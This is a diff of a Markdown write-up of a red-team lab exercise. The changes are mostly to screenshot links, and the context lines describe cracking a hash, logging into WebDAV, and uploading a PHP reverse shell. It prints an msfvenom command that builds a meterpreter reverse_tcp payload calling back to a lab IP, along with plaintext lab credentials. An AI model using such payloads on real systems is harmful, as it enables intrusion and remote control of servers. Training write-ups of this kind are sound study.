@@ -75,13 +75,15 @@ paste the password hash and filled out the CAPTCHA; and clicked Crack Hashes.
 
 	- In the URL bar, typed: dav://192.168.1.105/webdav, and entered the credentials to log in.
 
-![alt text](https://github.com/cyberprotocols/cyberpro_inc/blob/main/Ansible/docker_ps_screenshot.png)
+![alt text](https://github.com/jsanchez-cyberpro/Blue-vs-Red/blob/main/Red%20Team/10_connect_to_webdav.jpg)
 
 
 ### Step 6: Creating and Uploading a PHP reverse shell payload.
 
 - To set up the reverse shell, run:
 	- msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 >> shell.php
+
+![alt text](https://github.com/jsanchez-cyberpro/Blue-vs-Red/blob/main/Red%20Team/10_connect_to_webdav.jpg)
 
 - The series of command above does the following :
 
@@ -97,7 +99,11 @@ paste the password hash and filled out the CAPTCHA; and clicked Crack Hashes.
 
 	- exploit  
 
+![alt text](https://github.com/jsanchez-cyberpro/Blue-vs-Red/blob/main/Red%20Team/10_connect_to_webdav.jpg)
+
 - Placed the reverse shell onto the webDAV directory
+
+![alt text](https://github.com/jsanchez-cyberpro/Blue-vs-Red/blob/main/Red%20Team/10_connect_to_webdav.jpg)
 
 - We logged back in, visited the webdav folder by navigating to 192.168.1.105/webdav. Used the credentials obtained before, user:ryan pass:linux4u
 
